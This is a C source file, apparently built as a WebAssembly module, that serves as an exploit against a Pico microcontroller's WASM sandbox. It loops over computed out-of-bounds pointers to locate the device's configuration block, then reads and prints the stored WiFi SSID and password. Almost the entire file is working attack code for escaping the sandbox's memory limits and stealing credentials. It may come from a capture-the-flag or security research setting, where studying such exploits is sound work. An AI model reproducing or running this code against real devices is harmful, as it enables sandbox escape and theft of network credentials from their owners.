#include <stdint.h>

typedef struct pico_config {
	uint32_t magic;	  // Magic number
	uint32_t version; // Version number
	uint32_t crc;	  // CRC checksum

	// bootloader data
	uint32_t bootloader_state; // Bootloader state
	uint32_t os_b_len;		   // Length of OS B
	uint32_t os_a_len;		   // Length of OS A

	// wifi configuration
	uint32_t wifi_ssid_len; // Length of WiFi SSID
	uint32_t wifi_pass_len; // Length of WiFi password
	uint8_t wifi_ssid[32];	// WiFi SSID
	uint8_t wifi_pass[64];	// WiFi password

	// wasm configuration
	uint32_t wasm_length;		  // Length of WASM
	uint32_t default_wasm_length; // Length of default WASM
} pico_config;


int printf(const char* format, ...);

#define export __attribute__((visibility("default"))) __attribute__((used)) __attribute__((noinline))

#define REAL_CONFIG_ADDR 0x101F0000
#define RAM_START_ADDR 0x20000000
#define RAM_END_ADDR 0x20040000

export volatile uint32_t (*volatile read_u32)(volatile uint32_t*);

export uint32_t read_u32_(volatile uint32_t* addr) { return *addr; }
uint16_t read_u16(volatile uint16_t* addr) { return (uint16_t)read_u32((volatile uint32_t*)addr); }
uint8_t read_u8(volatile uint8_t* addr) { return (uint8_t)read_u32((volatile uint32_t*)addr); }

volatile uint32_t (*volatile read_u32)(volatile uint32_t*) = (volatile void*)read_u32_;


export int main(void) {
    printf("[*] Starting Pico config leak...\n");

    for (volatile uint32_t ram_addr = RAM_START_ADDR; ram_addr < RAM_END_ADDR; ram_addr += 4) {
        volatile pico_config* c = (pico_config*)(REAL_CONFIG_ADDR - ram_addr);

        // printf("[*] Checking address 0x%08X (0x%08X)...\n", (void*)c, (void*)ram_addr);

        // try to leak the wifi credentials
        uint16_t ssid_len = read_u16(&c->wifi_ssid_len);
        uint16_t pass_len = read_u16(&c->wifi_pass_len);
        if (ssid_len < 4 || pass_len < 8 || ssid_len > 32 || pass_len > 64) {
            // printf("[!] Invalid SSID or password length: %u, %u\n", ssid_len, pass_len);
            continue;
        }

        printf("[*] Found correct start location: 0x%08X\n", (void*)c);

        printf("[+] Read WiFi SSID length: %u\n", ssid_len);
        printf("[+] Read WiFi password length: %u\n", pass_len);

        char ssid[33] = {0};
        for (uint16_t i = 0; i < ssid_len; i++) {
            ssid[i] = read_u8(&c->wifi_ssid[i]);
        }

        char pass[65] = {0};
        for (uint16_t i = 0; i < pass_len; i++) {
            pass[i] = read_u8(&c->wifi_pass[i]);
        }

        printf("[*] WiFi SSID: %s\n", ssid);
        printf("[*] WiFi Password: %s\n", pass);

        printf("\n");

        return 0;
    }

    printf("[!] No valid Pico config found in the expected range.\n");
    return 1;
}
